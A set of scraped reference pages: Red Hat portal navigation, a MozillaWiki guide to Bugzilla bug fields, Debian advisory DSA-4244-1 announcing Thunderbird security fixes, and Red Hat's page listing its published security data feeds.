  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from wiki.mozilla.org_3659d679_20250126_073633.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)



=== Content from www.debian.org_abb0cadd_20250125_084124.html ===


---

[[Date Prev](msg00172.html)][[Date Next](msg00174.html)]
[[Thread Prev](msg00172.html)][[Thread Next](msg00174.html)]
[[Date Index](maillist.html#00173)]
[[Thread Index](threads.html#00173)]

# [SECURITY] [DSA 4244-1] thunderbird security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 4244-1] thunderbird security update
* *From*: Moritz Muehlenhoff <jmm@debian.org>
* *Date*: Fri, 13 Jul 2018 21:22:30 +0200
* *Message-id*: <[[🔎]](/msgid-search/20180713192230.GA10859%40pisco.westfalen.local) [20180713192230.GA10859@pisco.westfalen.local](msg00173.html)>
* *Reply-to*: debian-security-announce-request@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-4244-1                   security@debian.org
<https://www.debian.org/security/>                       Moritz Muehlenhoff
July 13, 2018                         <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : thunderbird
CVE ID         : CVE-2017-17689 CVE-2018-5188 CVE-2018-12359 CVE-2018-12360
                 CVE-2018-12362 CVE-2018-12363 CVE-2018-12364 CVE-2018-12365
                 CVE-2018-12366 CVE-2018-12372 CVE-2018-12373 CVE-2018-12374

Multiple security issues have been found in Thunderbird, which may lead
to the execution of arbitrary code, denial of service or attacks on
encrypted emails.

For the stable distribution (stretch), these problems have been fixed in
version 1:52.9.1-1~deb9u1.

We recommend that you upgrade your thunderbird packages.

For the detailed security status of thunderbird please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/thunderbird>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEtuYvPRKsOElcDakFEMKTtsN8TjYFAltI+2sACgkQEMKTtsN8
TjZXHRAAgOmSvTwwmmzxRH/4tSSpndZCFCtkHrG5PU5D3XesLGnWpNZk9aINsaU2
ih3fmEKzQgHHfAzK3d9TcGjyiI+PoVuWkVknsVqTrHd+xQtxUs7B/5Pfz5WKiYDJ
QJ4NhjTgHHystYa0j2CvK28/ZoPVZgwnc/D051ChTInPWXimJI+TxpsndW/NPuaJ
SphoPP34OMO2EARjrKCxiL6NRv6kD4CJv0AgoYfdO0qPXomuA8HpDAH1itd7GbRq
yVJoZRnpz9dGjJSM5wyFCc1BIqmA/CMphhmqiRTuFBA+rOSEDblzfc2tg9t82CVQ
caA7rF3VrYx8qmgpP3akCju+SDOEWLerFGHH1iaQ+GBqiXvduvMl/MSXCZmVZzIC
92Ko2m9kURkak4yKccEbHJ5Vh8i0oLUOc+Ee3MUUfWUblYbCcB4z34p9hRwc8u83
mmGUbsq+qWvdcd9NkekKC/ENQZt4Egb3doeEzqSkaa4uhFaQ1gGosHXGslNTCqLl
6RyeFON9Q5CWphQET+rmnlcJ8B1cSHgpG1ZTN6szlsQpiVgcRu/JYrgyzX9Y6WdY
rAape6t+gsEeLOP7n9pZ/KYSadUF5CvYY/nX9H6kJO1RmG9y0A+8wAEuW+nSOMMJ
vh2U09+y5XJHQqV0MMTKbnadxlyi8Oerc0zrYaoBuYhR7wmvkus=
=R2OH
-----END PGP SIGNATURE-----

```

---



=== Content from www.redhat.com_2cbad41c_20250126_073636.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)

  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Product Documentation](https://access.redhat.com/documentation)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)

  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform)
  [All Product Docs](//docs.redhat.com/en/products/)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)

  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Classifications](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Severety Ratings](https://access.redhat.com/security/security-updates/#/cve)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)

  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

 Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

# Security Data

Red Hat Product Security is committed to providing tools and security data to help security measurement. A part of this commitment is our active participation in various projects such as the CVE Project, the OASIS CSAF technical committee, or SBOM/VEX forums. We provide the raw data below so customers and researchers can produce their own metrics, for their own unique situations, and hold us accountable. To receive notifications when we fix bugs and add new features, please follow the official [Red Hat Security Data Changelog](https://access.redhat.com/articles/5554431).

The data resources linked on this page as well as their alternative representations available through the [Security Data API](https://access.redhat.com/documentation/en-us/red_hat_security_data_api/1.0/html/red_hat_security_data_api/index) are licensed under the [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/). If you distribute this content or a modified version of it, you must provide attribution to Red Hat, Inc. and provide a link to the original.

**Note:** Security data (CSAF, OVAL, SBOM, and other files) published by Red Hat Product Security was previously served from two locations:

* https://access.redhat.com/security/data/\*
* https://www.redhat.com/security/data/\*

A new domain was recently created the scope of which (for the time being) is to serve this same data:

* https://security.access.redhat.com/data/\*

Effective Sep 3, 2024, a redirect was put in place for all traffic from *www.redhat.com/security/data/\** to be redirected to the new *security.access.redhat.com/data/\** domain. On Sep 30, a similar change was made for *access.redhat.com/security/data/\** to redirect to *security.access.redhat.com/data/*. No change to the actual files or directory layout under the *data/\** path was made. You can start consuming from the new domain today. For example: <https://access.redhat.com/security/data/csaf/v2/vex/2024/cve-2024-0151.json> is now available at <https://security.access.redhat.com/data/csaf/v2/vex/2024/cve-2024-0151.json>; on Sep 30, the former began redirecting to the latter.

### CSAF/VEX Documents

The Common Security Advisory Framework (CSAF) standard enables organizations to share information about security issues using a consistent and common format. We provide Red Hat security advisories in CSAF format using the VEX profile as well as per-CVE VEX documents that contains information on both fixed and unfixed products/components.

* [CSAF GA announcement post](https://www.redhat.com/en/blog/csaf-vex-documents-now-generally-available)
  + [Link to CSAF advisories](https://security.access.redhat.com/data/csaf/v2/advisories/)
* [VEX files for CVEs GA announcement post](https://www.redhat.com/en/blog/red-hat-vex-files-cves-are-now-generally-available%20)
  + [Link to CSAF VEX per-CVE files](https://security.access.redhat.com/data/csaf/v2/vex/)

### OSV Records

[Red Hat / OSV.dev announcement on OpenSSF](https://openssf.org/blog/2024/11/01/red-hats-collaboration-with-the-openssf-and-osv-dev-yields-results-red-hat-security-data-now-available-in-the-osv-format/%20). The CSAF advisory data for RPMs is convertered to OSV records and shared with OSV.dev. It is expected that customers will consume this data from OSV.dev not directly from this URL. This is the location OSV.dev consumes the data from.

* [Link to Red Hat OSV data](https://security.access.redhat.com/data/osv/all.json)

### SBOM Documents

Software Bill of Materials (SBOM) is a complete list of components, their versions, licensing information, provenance, and other metadata for a given product. Red Hat publishes SBOM documents for select products at:

* [Link to SBOM documents](https://security.access.redhat.com/data/sbom/beta/spdx/)

### OVAL Definitions

**Note: OVAL/DS v1 files are no longer available and have been archived; see [OVAL v1 deprecation announcement](https://access.redhat.com/OVAL_v1_deprecation_announcement) for more information.**

OVAL definitions are available for vulnerabilities that were addressed in errata for Red Hat Enterprise Linux and select additional products. To completely evaluate your system you will need to evaluate it against the streams for all products installed on that system.

* [OVAL compatibility FAQ](https://access.redhat.com/articles/221883)
* [OVAL Streams directory](https://security.access.redhat.com/data/oval/v2/)
* [SCAP source data stream files](https://security.access.redhat.com/data/metrics/ds/v2/)

### Vulnerability Metadata

#### Repository to CPE Mapping

Used for matching [OVAL security data to installed RPMs](https://www.redhat.com/en/blog/how-accurately-match-oval-security-data-installed-rpms). Each repository also includes a set of relative URLs from where the content of the repository can be downloaded.

* [repository-to-cpe.json](https://security.access.redhat.com/data/meta/v1/repository-to-cpe.json)

#### RHSA RSS feed

An RSS feed that contains a list of Red Hat security advisories released in the last three days.

* [rhsa.rss](https://security.access.redhat.com/data/meta/v1/rhsa.rss)

#### CPE Dictionary

CPE is a structured naming scheme for information technology systems, software, and packages. For reference, we provide a dictionary mapping the CPE names we use, to Red Hat product descriptions. Some of these CPE names will be for new products that are not in the official CPE dictionary, and should therefore be treated as temporary CPE names:

* [cpe-dictionary.xml](https://security.access.redhat.com/data/meta/v1/cpe-dictionary.xml)

### Security Data Archive

Security data files that have been retired are available in an archive. Each file is marked with a date (YYYYMMDD) when it was last updated:

* [Link to Security Data archive](https://security.access.redhat.com/data/archive/)

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com)

### Help

* [Contact Customer Portal](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Systems Status

### About

* [Red Hat Subscription Value](https://access.redhat.com/subscription-value)
* [About Red Hat](https://www.redhat.com/about/)
* [Red Hat Jobs](http://jobs.redhat.com)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

Copyright © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)

×
### Formatting Tips

Here are the common uses of Markdown.

Code blocks
```
~~~
Code surrounded in tildes is easier to read
~~~
```

Links/URLs`[Red Hat Customer Portal](https://access.redhat.com)`

[Learn more](/help/markdown)
Close



=== Content from wiki.mozilla.org_73f8d6fa_20250126_073634.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
